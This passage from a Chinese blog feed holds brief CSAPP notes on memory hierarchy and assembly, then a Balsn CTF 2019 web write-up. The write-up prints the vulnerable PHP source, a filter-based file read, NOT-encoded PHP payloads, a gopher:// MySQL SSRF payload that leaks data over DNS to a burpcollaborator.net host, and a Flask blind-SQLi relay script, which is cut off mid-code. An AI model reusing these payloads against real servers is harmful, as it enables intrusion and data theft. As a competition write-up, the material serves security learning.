    <content type="html"><![CDATA[<p>在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。</p><p>但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。（虚拟内存是线性的？）</p><h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><h3 id="随机访问存储器-RAM"><a href="#随机访问存储器-RAM" class="headerlink" title="随机访问存储器 RAM"></a>随机访问存储器 RAM</h3><ul><li>静态 SRAM：容量小，存取速度快，以触发器（双稳态）做为存储元，通常做 cache。</li><li>动态 DRAM：容量大，速度较慢，以 MOS 晶体管和电容器组成的电路做存储元，通常做主存储器。</li></ul><h3 id="磁盘存储"><a href="#磁盘存储" class="headerlink" title="磁盘存储"></a>磁盘存储</h3><p>磁盘属于外部 I/O 设备，其特点是存储容量大，速度慢，价格便宜。其利用磁性材料被磁化后，会形成两个稳定的剩磁状态的性质，就像触发器的双稳态一样。</p><h2 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h2><p>在程序中，程序倾向于引用邻近与其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。这种倾向性，被称为局部性原理。</p><p>这是一个持久的概念，对硬件和软件系统的设计和性能都有着极大的影响。</p><p>局部性通常有两种不同的形式，时间上，空间上。</p><p>在一个具有良好时间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能在不远的将来引用附近的一个内存位置。</p><h2 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h2><p>不同存储技术的访问时间差异很大。速度较快的技术每字节的成本要比速度较慢的技术高，而且容量较小。CPU 和主存之间的速度差距在增大。</p><p>一个编写良好的程序倾向于展示出良好的局部性。</p><h2 id="高速缓存存储器"><a href="#高速缓存存储器" class="headerlink" title="高速缓存存储器"></a>高速缓存存储器</h2><p>缓存的理念，简单来说就是，最常用的数据就那么点，将其放到读取速度最快的存储区域，将大大提高运行效率。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。&lt;/p&gt;
&lt;p&gt;但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。（虚拟内存是线性的？）&lt;/p&gt;
&lt;h2 id=&quot;存储技术
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 程序的机器级表示 笔记</title>
    <link href="https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/"/>
    <id>https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/</id>
    <published>2019-10-10T15:33:45.000Z</published>
    <updated>2020-01-09T08:00:46.872Z</updated>
    
    <content type="html"><![CDATA[<p>在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gcc -Og -c hello.c  # 表示优化等级为最低，贴近原始汇编</span><br><span class="line"></span><br><span class="line">-O （同-O1）</span><br><span class="line">-O0 （不进行优化，如果未指定优化级别，则为默认值）</span><br><span class="line">-O1 （最小化优化）</span><br><span class="line">-O2 （优化更多）</span><br><span class="line">-O3 （优化更多）</span><br><span class="line">-Ofast （非常积极地进行优化以达到标准的要求）</span><br><span class="line">-Og （优化调试体验-Og支持不影响调试的优化 ）</span><br><span class="line">-Os（优化大小。-Os使所有-O2的优化，通常不会增加代码的大小也进行设计，以减少代码量进一步优化。 -Os禁用以下优化标志：-falign-functions -falign-jumps -falign-loops -falign-labels -freorder-blocks -freorder-blocks-and-partition -fprefetch-loop-arrays -ftree-vect-loop-version）</span><br></pre></td></tr></table></figure><p>对于机器级编程来说，其中两种抽象尤为重要。</p><p>一个是机器级程序的格式和行为，定义为<strong>指令体系结构</strong>（Instruction Set Architecture，ISA ），它定义了处理器状态，指令的格式以及每条指令对状态的影响。大多数ISA,包括IA32和x86-64，将程序的行为描述成<strong>好像</strong>每条指令时顺序执行的。一条指令执行结束后，下一条指令开始执行。处理器的硬件远远比描述的精细复杂，它们能够并发的地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行行为一致。</p><p>第二种抽象是，机器级程序使用的存储器地址是<strong>虚拟地址</strong>，提供的存储器模型看上去是一个非常大的字节数组。</p><p>在整个编译过程中，编译器会主要将C语言提供的相对抽象的执行模型表示的程序转化为处理器执行的非常基本的命令。汇编代码非常接近于机器代码。与机器码的二进制格式相比，汇编代码的一个主要特点是，<strong>它用可读性更好的文本格式来表示。</strong></p><p><strong>能够理解汇编代码以及它与原始C代码的联系，是理解计算机系统如何执行程序关键的一步。</strong></p><p>二三章还是没啥意思，以前都学过了，最近在看<em>程序员的自我修养</em>，真是一本好书，解决了很多我对底层的疑问，一定要多读几遍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Balsn CTF 2019 两道 web 题</title>
    <link href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-%E4%B8%A4%E9%81%93web%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/10/06/BalsnCTF-2019-两道web题/</id>
    <published>2019-10-06T02:21:58.000Z</published>
    <updated>2019-11-04T02:29:49.028Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><blockquote><p>常见绕过、gopher 打 MySQL、SSRF</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wblbfld6j20sf0artal.jpg" alt></p><p>一打开题目就能看到源码，稍稍有点混淆，整理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt(</span><br><span class="line">            $ch,</span><br><span class="line">            CURLOPT_URL,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"int"</span>,</span><br><span class="line">                <span class="string">":DD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%69%6e%74"</span>,</span><br><span class="line">                    <span class="string">"XDDD"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">"%2e%2e"</span>,</span><br><span class="line">                        <span class="string">"Q___Q"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">".."</span>,</span><br><span class="line">                            <span class="string">"QAQ"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%33%33%61"</span>,</span><br><span class="line">                                <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"%63%3a"</span>,</span><br><span class="line">                                    <span class="string">"WTF"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"633a"</span>,</span><br><span class="line">                                        <span class="string">":)"</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"433a"</span>,</span><br><span class="line">                                            <span class="string">":("</span>,</span><br><span class="line">                                            str_repLace(</span><br><span class="line">                                                <span class="string">"\x63:"</span>,</span><br><span class="line">                                                <span class="string">"ggininder"</span>,</span><br><span class="line">                                                strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                            )</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'⁣'</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码并不需要额外配置，却加载了一个 <code>config.php</code>，有点蹊跷，先读下源代码看看。有两种办法，一是通过 <code>eval</code>，而是利用 <code>file_get_contents</code>，后者明显要简单些。这样的后缀检查加个空格就能过。因为读取有长度限制，可直接使用伪协议进行压缩，然后解压即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure><p>得到内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    %</span><br></pre></td></tr></table></figure><p>看到了这个提示，MySQL 还是空密码，目标就相当明确了，<code>gopher</code> 打 MySQL 即可，<code>file_get_contents</code> 一般打不出 <code>gopher</code>。那就利用之前的 <code>curl</code>，这里也有三重限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure><p>至于第一个正则匹配，取反就行了，都是常见技巧，比如 <code>phpinfo</code> =&gt; <code>(~%8F%97%8F%96%91%99%90)()</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g7wda6pcyqj215v07wgmy.jpg" alt="image.png"></p><p><code>gopher</code> 的 payload 都比较长，直接传是不可能的。之前出过很多无参函数的题，常见的手法是通过 <code>getenv</code>、<code>getallheaders</code> 、<code>get_defined_vars</code>之类的函数获取参数。由于长度的限制，最好的选择就是 <code>getenv</code>。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%A7) =&gt; <span class="keyword">getenv</span>(<span class="string">"HTTP_T"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wnp8fcxzj20p803smxh.jpg" alt="image.png"></p><p>成功打出请求，接下来继续打 MySQL， <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a> 生成下 payload。</p><p>phpinfo 中能看到是 Windows 的机器，验证一下能不能 <a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">DNS 数据外带</a>，不然只能当盲注处理了。</p><p>（PS：本地实验记得修改 mysql.ini 文件，在 [mysqld] 下加入 secure_file_priv =  )</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: admin</span><br><span class="line">Give port: <span class="number">8787</span></span><br><span class="line">Give query <span class="keyword">to</span> execute: <span class="keyword">select</span> load_file(concat('\\\\',version(),'.<span class="number">9</span>fp<span class="number">07</span>q<span class="number">2</span>nho<span class="number">1</span>v<span class="number">8</span>tn<span class="number">68</span>szls<span class="number">54</span>d<span class="number">94</span>fu<span class="number">3</span>j.burpcollaborator.net/a'))<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Your gopher link is ready to do SSRF : </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gopher://127.0.0.1:8787/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%65%00%00%00%03%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%63%6f%6e%63%61%74%28%27%5c%5c%5c%5c%27%2c%76%65%72%73%69%6f%6e%28%29%2c%27%2e%39%66%70%30%37%71%32%6e%68%6f%31%76%38%74%6e%36%38%73%7a%6c%73%35%34%64%39%34%66%75%33%6a%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%61%27%29%29%3b%01%00%00%00%01</span></span><br></pre></td></tr></table></figure><p>成功收到请求。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.16-MariaDB</span><span class="selector-class">.9fp07q2nho1v8tn68szls54d94fu3j</span><span class="selector-class">.burpcollaborator</span><span class="selector-class">.net</span>.</span><br></pre></td></tr></table></figure><p>继续获取数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">"\\\\"</span>,<span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">group_concat</span>(schema_name)),<span class="number">39</span>,<span class="number">68</span>),<span class="string">".9fp07q2nho1v8tn68szls54d94fu3j.burpcollaborator.net/a"</span>)) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="comment">-- 得到了数据库名 test,thisisthedbname，需要注意的是太长了出不了网，不能出现像逗号这种的特殊符号</span></span><br></pre></td></tr></table></figure><p>接下来就是老套路了，读表名、列名，拿数据。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span>  =&gt;  Balsn&#123;<span class="number">3</span>z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure><p>有师傅把上面的过程整合了下，通过 flask 转发，然后就能 sqlmap 一把梭，值得学习，代码如下。</p><p> <a href="https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html" target="_blank" rel="noopener">https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">                <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">                <span class="string">'Σ&gt;―(#°ω°#)♡→'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 